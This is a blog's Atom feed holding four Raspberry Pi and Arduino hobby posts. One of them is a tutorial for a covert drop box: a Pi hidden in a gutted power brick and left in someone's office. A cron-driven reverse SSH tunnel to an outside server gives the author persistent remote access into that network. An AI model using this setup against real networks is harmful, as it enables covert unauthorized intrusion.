<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: electronics | TunnelsUP]]></title>
  <link href="https://www.tunnelsup.com/tup/tag/electronics/atom.xml" rel="self"/>
  <link href="https://www.tunnelsup.com/"/>
  <updated>2020-01-15T19:52:53-08:00</updated>
  <id>https://www.tunnelsup.com/</id>
  <author>
    <name><![CDATA[Jack]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Raspberry Pi Zero: Blink an LED using GPIO pins]]></title>
    <link href="https://www.tunnelsup.com/raspberry-pi-zero-blink-an-led-using-gpio-pins/"/>
    <updated>2016-09-14T12:19:00-07:00</updated>
    <id>https://www.tunnelsup.com/raspberry-pi-zero-blink-an-led-using-gpio-pins</id>
    <content type="html"><![CDATA[<p>Want to use the GPIO pins to blink an LED using a Raspberry Pi Zero? Here&rsquo;s a quick guide to get you started.</p>

<h2>Build the circuit</h2>

<p>Do this is the Raspberry Pi off. You don&rsquo;t want to accidentally touch the wrong pin on the Pi and fry the Pi.</p>

<p>Use <a href="http://pinout.xyz">http://pinout.xyz</a> to check the pinouts of the Raspberry Pi.</p>

<p>Create a circuit that goes from GND to LED to resistor to GPIO pin (BCM).</p>

<p><img src="https://www.raspberrypi.org/wp-content/uploads/2015/11/led-gpio17.png" width="500"></p>

<h2>Install the Python Library</h2>

<p>We&rsquo;ll be using python to build our program so first download the python library. There is an api to interface with the GPIO pins which makes this a lot easier.</p>

<p><code>
sudo apt-get install python3-gpiozero python-gpiozero
</code></p>

<p><a href="https://gpiozero.readthedocs.io/">https://gpiozero.readthedocs.io/</a> for more information on this library.</p>

<h2>Create the Program</h2>

<p>Now create a file called <code>blink.py</code> and put the following in it:</p>

<p>```python
from gpiozero import LED
from time import sleep</p>

<p>led = LED(17) # Choose the correct pin number</p>

<p>while True:</p>

<pre><code>led.on()
sleep(1)
led.off()
sleep(1)
</code></pre>

<p>```</p>

<h2>Run the Program</h2>

<p>Run the program with the following command:</p>

<p><code>
python blink.py
</code></p>

<p>If all went well you should now see your LED blinking!</p>

<h2>References</h2>

<p><a href="https://gpiozero.readthedocs.io/">https://gpiozero.readthedocs.io/</a></p>

<p><a href="https://www.raspberrypi.org/blog/gpio-zero-a-friendly-python-api-for-physical-computing/">https://www.raspberrypi.org/blog/gpio-zero-a-friendly-python-api-for-physical-computing/</a></p>

<p><a href="http://pinout.xyz">http://pinout.xyz</a></p>

<p><a href="https://hackr.io/tutorials/python">https://hackr.io/tutorials/python</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Raspberry Pi boots into emergency kernel when loading raspian]]></title>
    <link href="https://www.tunnelsup.com/raspberry-pi-boots-into-emergency-kernel-when-loading-raspian/"/>
    <updated>2013-07-20T15:36:00-07:00</updated>
    <id>https://www.tunnelsup.com/raspberry-pi-boots-into-emergency-kernel-when-loading-raspian</id>
    <content type="html"><![CDATA[<p>Recently I tried updating my Raspian OS on my Pi. After writing the OS to the card and popping it into the Pi, the Pi would only boot into the emergency kernel mode. Basically it dumped me into a very basic shell without the need to login or anything. It gives very limited commands and doesn&rsquo;t really allow for any real operation. Something definitely isn&rsquo;t right.</p>

<h2>The Fix</h2>

<p>Edit the file <code>config.txt</code> and add this line into the bottom of the file:</p>

<p><code>
avoid_safe_mode=1
</code></p>

<p>This should now allow you to boot into regular kernel mode.</p>

<h2>The Reason for the Problem</h2>

<p>The problem seems to be related to early Revision 1 model B boards. My board in particular shows this:</p>

<p><code>
pi@raspberrypi:~$ grep Rev /proc/cpuinfo
Revision : 0002
</code>
It looks like it&rsquo;s Rev 2, but that output actually is saying Rev 1.</p>

<p>What&rsquo;s likely happening here is that I have a Rev 2 board but for some reason the OS thinks it&rsquo;s Rev 1. There are different pins that do different things on the two boards and therefore cause the wrong behavior to occur.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Raspberry Pi: Phoning home using a reverse remote ssh tunnel]]></title>
    <link href="https://www.tunnelsup.com/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel/"/>
    <updated>2013-05-08T00:00:00-07:00</updated>
    <id>https://www.tunnelsup.com/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel</id>
    <content type="html"><![CDATA[<p><img src="/images/pi6.jpg" alt="Pi IMG" /><br>
What&rsquo;s this? Just an ordinary powerbrick? Read on to find out why this is an incredibly dangerous thing to see in your office.</p>

<p>When I received my raspberry pi I immediately wanted to use it as a <del>hacking</del> remote tech support tool. The idea was to be able to plug it in somewhere and it be small enough that it&rsquo;s not noticed in someone&rsquo;s network. Then if I could access it remotely I am in their network and can do things.</p>

<h2>Part 1: Setting up the Pi</h2>

<p>The problem is that if I plug this in somewhere in the world and leave it I need it to phone home so I can gain remote connectivity to it. I know my home&rsquo;s IP but I don&rsquo;t know the Pi&rsquo;s IP. I want it to be a plug in and run away type of scenario and not one that I&rsquo;ll be hooking up any monitor or keyboard or anything.</p>

<h3>Pre-configuration</h3>

<p>Before beginning you need to have the following:</p>

<ul>
<li>Raspberry Pi with a Linux OS on it</li>
<li>Raspberry Pi is configured to receive a DHCP address</li>
<li>Raspberry Pi is configured to receive ssh connections</li>
<li>A seperate linux server that is reachable by ssh from the internet. This server should have a static public IP.</li>
</ul>


<!--more-->


<p>It should be easy enough to figure out how to complete these on your own. With the above, you should be able ssh to the Pi remotely if you know its IP. Well you don&rsquo;t know its IP and even if you did it is probably behind a firewall which makes it impossible to get to. Or so you think.</p>

<p>What you&rsquo;ll need is a linux server that has a persistent IP. One that you can ssh into from anywhere in the world. Suppose it&rsquo;s IP is 25.25.25.25. Even though my home network gets a dynamic IP from my ISP it usually stays the same for weeks and even years. All I&rsquo;ve done is forwarded port 22 through the firewall to a linux server to make this work.</p>

<h3>Setting up the ssh certificate on the Pi</h3>

<p>From the Raspberry Pi you should be able to ssh to this linux server. Test it to be sure. So now you want to set it up so the authentication is certificate based (this way the Pi can be set up to auto ssh into the server without being prompted for a password).</p>

<p>Follow this guide for setting up <a href="/ssh-without-password/">automatic ssh login using ssh keys</a>.</p>

<h3>Creating the Reverse SSH tunnel</h3>

<p>Now comes the fun part. Create a reverse remote ssh tunnel to that host to forward connections back to the Pi. Confused? Here look at this command you would issue from the Pi:</p>

<p><code>
ssh -N -R 2222:localhost:22 serverUser@25.25.25.25
</code></p>

<p>The Pi is ssh'ing to the server at 25.25.25.25 using the username &ldquo;serverUser&rdquo;. Upon doing so, it&rsquo;s telling that server to open port 2222. Any connections coming into the server on port 2222 forward them over the tunnel back to the Pi on port 22. The -N tag is saying we don&rsquo;t need to actually send any ssh commands once connected.</p>

<p>Once the Pi sets up that remote tunnel; from the server it connected to you can do this:</p>

<p><code>
ssh -l piUser -p 2222 localhost
</code></p>

<p>Now you should be ssh&rsquo;d into the Pi using port 2222 on the linux server! Awesome!</p>

<p>Why did this work? The linux server is listening on port 2222 for incoming ssh connections. If it receives one, it will forward all traffic it receives into the previous ssh connection that was established already. That is essentially what the remote tunnel does.</p>

<h3>Making it persistent (always on)</h3>

<p>Next is to make this a persistent thing. You want the Pi to keep trying to build this ssh tunnel always and if it goes down try to bring it back. We&rsquo;ll do this using a bash script and cron job.</p>

<p>Create a file on the Pi called ~/create_ssh_tunnel.sh and put this in it:</p>

<p>``` bash</p>

<h1>!/bin/bash</h1>

<p>createTunnel() {
  /usr/bin/ssh -N -R 2222:localhost:22 <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#115;&#x65;&#114;&#118;&#101;&#x72;&#85;&#x73;&#x65;&#114;&#64;&#x32;&#53;&#x2e;&#50;&#x35;&#46;&#x32;&#x35;&#x2e;&#50;&#53;">&#115;&#101;&#114;&#x76;&#101;&#x72;&#x55;&#115;&#101;&#x72;&#x40;&#50;&#53;&#x2e;&#x32;&#53;&#46;&#50;&#53;&#x2e;&#x32;&#53;</a>
  if [[ $? -eq 0 ]]; then</p>

<pre><code>echo Tunnel to jumpbox created successfully
</code></pre>

<p>  else</p>

<pre><code>echo An error occurred creating a tunnel to jumpbox. RC was $?
</code></pre>

<p>  fi
}
/bin/pidof ssh
if [[ $? -ne 0 ]]; then
  echo Creating new tunnel connection
  createTunnel
fi
```</p>

<p>What this program is doing is checking to see if there&rsquo;s a process running called &lsquo;ssh&rsquo;. If there isn&rsquo;t then start the ssh tunnel.</p>

<p>Next make it executable by doing the following:</p>

<p><code>
chmod 700 ~/create_ssh_tunnel.sh
</code></p>

<p>Now start the crontab.</p>

<p><code>
crontab -e
</code>
Place this in as your cron job (every minute check if the ssh connection is up, if not, attempt to bring it up)</p>

<p><code>
*/1 * * * * ~/create_ssh_tunnel.sh &gt; tunnel.log 2&gt;&amp;1
</code>
To troubleshoot any problems in this you can view the tunnel.log file.</p>

<p>Now let&rsquo;s take a step back and look at what we&rsquo;ve done. When the Raspberri Pi is on, it will check every minute to see if an ssh connection to your linux server exists. If it doesn&rsquo;t it will create one. The tunnel it creates is really a reverse remote tunnel. Once the tunnel is up, anyone who ssh&rsquo;s into port 2222 of the linux server will then be redirected to the Pi. Incredible!</p>

<h2>Part 2: Concealing the Pi</h2>

<p>I found an old powerbrick for a laptop and gutted it.<br>
<img src="/images/pi2.jpg" alt="Pi IMG" /></p>

<p>The raspberry pi almost fit. I had to solder off the S-Video port to get it to fit just right.<br>
<img src="/images/pi3.jpg" alt="Pi IMG" /></p>

<p>Then I had to hook power up to it. In order to do this I simply took apart a USB charger. Took the plastic casing off to save space and cut the cord to save even more space. Then I soldered where the powerbrick power feed is into the USB power feed. This way when I power up the brick, it&rsquo;ll give power to the USB charger which will in turn power the Pi.<br>
<img src="/images/pi4.jpg" alt="Pi IMG" /></p>

<p>Lastly was finding a black ethernet cable so both cables coming out of the power brick are black and look inconspicuous.<br>
<img src="/images/pi5.jpg" alt="Pi IMG" /></p>

<p>Here are pictures of it in its special case:<br>
<img src="/images/pi6.jpg" alt="Pi IMG" /><br>
<img src="/images/pi7.jpg" alt="Pi IMG" /></p>

<h2>Part 3: Testing it</h2>

<p>Check it out! <br>
<img src="/images/pi1.jpg" alt="Pi IMG" /></p>

<p>I have this plugged into an office somewhere. It looks weird when you stare at it but put it behind a plant and nobody will ever notice it (except the guy who waters the plants).</p>

<p>Once I plugged it in I went back home. Right after the Pi got an IP address it created a tunnel to my home server. When I tried ssh'ing into port 2222 of my home server I was redirected to the Pi. Now I am on a computer in someone elses network. Woohoo! Now I can do remote tech support more effectively.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Arduino Power Usage Project]]></title>
    <link href="https://www.tunnelsup.com/arduino-power-usage-project/"/>
    <updated>2011-09-19T00:00:00-07:00</updated>
    <id>https://www.tunnelsup.com/arduino-power-usage-project</id>
    <content type="html"><![CDATA[<p>I wanted to see how much power I am consuming in my home at any given moment, so I created this project using arduino.  It features a simple display of LEDs: red representing high energy usage, yellow moderate usage, and green low usage.</p>

<iframe src="http://www.youtube.com/embed/ZAjG0oVoZ-4" frameborder="0" width="420" height="315"></iframe>


<h3>Parts List:</h3>

<p><img src="/images/ArduinoMega-150x150.jpg" alt="Arduino Mega - IMG" /></p>

<p><img src="/images/arduino_ethernet_connect1-150x150.jpg" alt="Ethernet Shield - IMG" /></p>

<p><img src="/images/mtu-ct-150x150.jpg" alt="TED - IMG" /></p>

<p><img src="/images/TEDGateway-150x150.jpg" alt="TED Gateway - IMG" /></p>

<ul>
    <li>Arduino Mega</li>
    <li>Arduino EthernetShield V1.1</li>
    <li>TED 5000</li>
    <li>Linux Webserver</li>
    <li>9 LEDs (with jumpers and resistors)</li>
</ul>


<h3>Diagram of how they all fit together:</h3>

<p><img src="/images/powerprojectgraphic.png" alt="Project Diagram - IMG" /></p>

<h5>STEP 1 &ndash; TED</h5>

<p><img class="alignnone size-medium wp-image-194" style="float: right;" title="ted-footprints" src="https://www.tunnelsup.com/images/ted-footprints-200x300.jpg" alt="" width="200" height="300" />Get <a href="http://www.theenergydetective.com/">TED (The Energy Detective) </a>working at your house. This is a nifty little unit that has a device called an MTU that sits in your electrical panel to monitor your mains and how much electricity they use. Then it sends that data through the electrical wiring in your house to the gateway. The gateway then has an ethernet cable connected to to it and plugs into your home network.</p>

<p>The TED gateway makes a call every 5 seconds to get a reading from the MTU which is the device sitting in the main electrical panel. In my case, the TED gateway has an IP address of 172.16.200.216. Upon going to that website it has nice graphical display of real time power usage. The picture on the right is what the live kw usage shows on the TED software.</p>

<p>Upon doing some investigations with firebug I found that the website was drawing its information from an xml file called &ldquo;/api/LiveData.xml&rdquo;. This is the xml file that is updated every 5 seconds from the sensor outside.  I examined the xml file and found the current power reading is within the <PowerNow> xml value.</p>

<h5>STEP 2 &ndash; PERL</h5>

<p>Now I thought it would be smart for me to write a perl script on a server that basically goes to TED&rsquo;s XML file that has the data I need and extract just that bit. I&rsquo;m not very good with perl and just wanted something to get the job done so I apologize if this is ugly or isn&rsquo;t effecient. I put this perl script in my cgi-bin directory of my webserver so it can be called remotely. Really the purpose of this is to scrub the data from the xml file and make this a much smaller input for the arduino. The xml file from TED was rather large for arduino to handle every 5 seconds. Here is the perl program I wrote.</p>

<p>```</p>

<h1>!/usr/bin/perl</h1>

<p>use LWP::UserAgent;
use <a href="HTTP::Request;">HTTP::Request;</a>
my $agent = LWP::UserAgent->new(env_proxy => 1,keep_alive => 1, timeout => 30);
my $url = &ldquo;<a href="http://172.16.200.217/api/LiveData.xml">http://172.16.200.217/api/LiveData.xml</a>&rdquo;;
my $header = <a href="HTTP::Request-">HTTP::Request-</a>>new(GET => $url);
my $request = <a href="HTTP::Request-">HTTP::Request-</a>>new(&lsquo;GET&rsquo;, $url, $header);
my $response = $agent->request($request);</p>

<p>if ($response->is_success){
   print &ldquo;Content-type: text/html\r\n\r\n&rdquo;;
   if ($response->content=~/<PowerNow>(\d*)&lt;\/PowerNow>/) {</p>

<pre><code>  print $1;
</code></pre>

<p>   }
} else {
 print &ldquo;No response&rdquo;;
}
```</p>

<h5>STEP 3 &ndash; ARDUINO</h5>

<p>So now I just need the arduino to make a webcall to my webserver located at 172.16.200.200/cgi-bin/powerget.cgi and then display the LEDs depending on what value comes back. I wired the arduino to a breadboard with 9 LEDS. It looks like this.</p>

<p><img src="/images/IMG_7145-300x225.jpg" alt="Arduino - IMG" /></p>

<p>There are 3 green, 3 yellow and 3 red lights. More lights will light up depending on how much energy is being used. Key to reading lights:</p>

<ol>
    <li>Below 100W</li>
    <li>Between 100-500W</li>
    <li>Between 500-1000W</li>
    <li>Between 1000-1500W</li>
    <li>Between 1500-5000W</li>
    <li>Between 5000-7500W</li>
    <li>Between 7500-10,000W</li>
    <li>Between 10,000-12,500W</li>
    <li>Above 15,000W</li>
</ol>


<p>&nbsp;</p>

<p>Arduino code:</p>

<p>```</p>

<h1>include &lt;EtherShield.h></h1>

<h1>define HTTPPATH &ldquo;/cgi-bin/powerget.cgi&rdquo;</h1>

<h1>define PORT 80</h1>

<h1>define HOSTNAME &ldquo;&rdquo;  //unknown what this value is for yet</h1>

<h1>define BUFFER_SIZE 550</h1>

<p>byte buf[BUFFER_SIZE+1];
byte websrvip[4] = { 172,16,200,200 }; // set destination IP
byte mymac[6] = {0x54,0x55,0x58,0x10,0x00,0x25};
byte myip[4] = {172,16,200,77}; // Arduino&rsquo;s IP
byte gwip[4] = {172,16,200,2}; // Default gateway.
byte conn = 0; // used to track connections
int packetlength = 0; //used in loop
int powernow = 0; //global current value of power consumption
const byte numofLEDs = 9;
byte ledStates[numofLEDs];
const byte ledPins[numofLEDs] =  {23,24,25,26,27,28,29,30,31}; // the number of the LED pins
unsigned long timetosend;</p>

<p>EtherShield es=EtherShield();</p>

<p>void browserresult_callback(byte statuscode,word pos){</p>

<pre><code>// Get specific data from the web call (assuming power is never over 99,999W)
char currentpower[5] = {buf[240], buf[241], buf[242], buf[243], buf[244]};
// convert the string to an integer to do math on it
powernow = atoi(currentpower);
conn = 1; // If conn == 1 then the program knows the network connection worked
</code></pre>

<p>}</p>

<p>void setup(){</p>

<p>  es.ES_enc28j60Init(mymac); //initialize enc28j60</p>

<p>  //init the ethernet/ip layer:
  es.ES_init_ip_arp_udp_tcp(mymac, myip, PORT);</p>

<p>  // init the web client:
  es.ES_client_set_gwip(gwip);
  es.ES_client_set_wwwip(websrvip);</p>

<p>  // init the pins for LEDs
  for (byte i = 0; i &lt; numofLEDs; i++) {
   pinMode(ledPins[i], OUTPUT);
  }</p>

<p>}</p>

<p>void loop()
{
  // handle ping and wait for a tcp packet
  // calling this routine powers the sending and receiving of data
  //defined as: uint16_t ES_enc28j60PacketReceive(uint16_t len, uint8_t* packet);
  packetlength = es.ES_enc28j60PacketReceive(BUFFER_SIZE, buf);
  es.ES_packetloop_icmp_tcp(buf,packetlength);</p>

<p>  if( millis() &ndash; timetosend > 5000) // every 5 seconds
  {</p>

<pre><code>  timetosend = millis(); //this number should overload every 50 days or so...
  //request data from web server place data in buf[] 
  es.ES_client_browse_url(PSTR(HTTPPATH), NULL , PSTR(HOSTNAME), &amp;browserresult_callback);

  // reset all LEDs back to off
  for (byte i = 0; i &lt; numofLEDs; i++) {
    ledStates[i] = LOW;
    digitalWrite(ledPins[i], ledStates[i]);
  }
  // Set which LEDs should be on 
  if (conn == 1) {
    if ((powernow &gt; 100) &amp;&amp; numofLEDs&gt;0) ledStates[0] = HIGH;
    if ((powernow &gt; 500) &amp;&amp; numofLEDs &gt; 1) ledStates[1] = HIGH;
    if ((powernow &gt; 1000) &amp;&amp; numofLEDs &gt; 2) ledStates[2] = HIGH;
    if ((powernow &gt; 1500) &amp;&amp; numofLEDs &gt; 3) ledStates[3] = HIGH;
    if ((powernow &gt; 5000) &amp;&amp; numofLEDs &gt; 4) ledStates[4] = HIGH;
    if ((powernow &gt; 7500) &amp;&amp; numofLEDs &gt; 5) ledStates[5] = HIGH;
    if ((powernow &gt; 10000) &amp;&amp; numofLEDs &gt; 6) ledStates[6] = HIGH;
    if ((powernow &gt; 12500) &amp;&amp; numofLEDs &gt; 7) ledStates[7] = HIGH;
    if ((powernow &gt; 15000) &amp;&amp; numofLEDs &gt; 8) ledStates[8] = HIGH;
  } else {
    // If network outage - turn on the top LED only to indicate a problem
    if (ledStates[numofLEDs-1] = HIGH);
  }
  conn = 0; 

  // Turn on all the LEDs that need to be on
  for (byte i = 0; i &lt; numofLEDs; i++) {
   digitalWrite(ledPins[i], ledStates[i]);
  }
</code></pre>

<p>  }
}
```</p>

<p>A few notes about using that ethernet shield with the arduino mega. First of all I used the Ethershield library located here:
<a href="http://blog.thiseldo.co.uk/?p=504"> <a href="http://blog.thiseldo.co.uk/?p=504">http://blog.thiseldo.co.uk/?p=504</a></a></p>

<p>Second, I had to hack ethernet board to get the two boards to talk to each other (this was really aggravating and I wish I had a different ethershield to work with). The hack I used was to bend certain pins that we don&rsquo;t need to use and run jumpers to pins we do need to use. I followed the directions here to accomplish this:
<a href="http://mcukits.com/2009/04/06/arduino-ethernet-shield-mega-hack/"> <a href="http://mcukits.com/2009/04/06/arduino-ethernet-shield-mega-hack/">http://mcukits.com/2009/04/06/arduino-ethernet-shield-mega-hack/</a></a></p>

<p>Now unfortunately I still wasn&rsquo;t done. The ethershield library thinks you have a duemilanove so I had to make one last adjustment. <span style="color: #292929; font-family: 'Helvetica Neue', Arial, Helvetica, sans-serif;"><span class="Apple-style-span" style="font-size: 14px; line-height: 17px;">  </span></span></p>

<p>In the file:  enc28j60.h (usually found in arduino\libraries\EtherShield)</p>

<p>I changed the definitions for the SPI interface.  Changed the ports to be as follows:</p>

<p>```</p>

<h1>define DEFAULT_ENC28J60_CONTROL_CS    53</h1>

<h1>define SPI_MOSI                       51</h1>

<h1>define SPI_MISO                       50</h1>

<h1>define SPI_SCK                        52</h1>

<p>```</p>
]]></content>
  </entry>
  
</feed>
